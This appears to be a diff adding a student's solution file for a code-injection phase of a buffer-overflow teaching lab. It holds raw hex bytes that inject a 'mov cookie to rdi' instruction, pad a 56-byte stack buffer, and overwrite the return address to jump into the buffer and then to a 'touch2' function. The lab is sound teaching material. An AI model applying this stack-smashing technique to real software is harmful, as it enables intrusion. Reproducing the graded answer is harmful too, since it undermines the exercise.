@@ -1,0 +1,13 @@
+                        /* start of buffer */
+48 c7 c7 a5 8f 6f 1d c3 /* movq cookie hex to rdi */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* end of 56 byte buffer */
+
+38 16 67 55 00 00 00 00 /* return to buf address */
+78 17 40 00 00 00 00 00 /* call to touch2 */
+
+ 
